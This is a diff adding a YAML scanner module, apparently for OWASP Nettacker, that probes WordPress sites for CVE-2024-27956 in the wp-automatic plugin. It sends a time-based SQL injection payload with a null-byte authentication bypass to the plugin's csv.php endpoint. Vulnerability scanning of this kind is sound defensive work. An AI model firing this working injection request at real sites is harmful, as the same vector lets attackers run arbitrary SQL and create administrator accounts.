@@ -1,0 +1,53 @@
+info:
+  name: wp_RCE_cve_2024_27956_vuln
+  author: Manushya
+  severity: 8
+  description: The wp-automatic plugin for WordPress <= 3.57.6 is vulnerable to an SQL injection vulnerability in the CSV import functionality, which allows remote attackers to execute arbitrary SQL commands. This can result in privilege escalation by creating administrator accounts.
+  reference: 
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-27956
+    - https://github.com/diego-tella/CVE-2024-27956-RCE
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - high_severity
+    - cve2024
+    - cve
+    - wordpress
+    - sqli
+    - wp_plugin
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 20
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: "application/x-www-form-urlencoded"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/wp-content/plugins/wp-automatic/inc/csv.php"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        body: 
+          q: q=SELECT IF(1=1,sleep(5),sleep(0));&auth=%00&integ=dc9b923a00f0e449c3b401fb0d7e2fae
+          auth: "\0"
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: '200'
+              reverse: false
+
+      
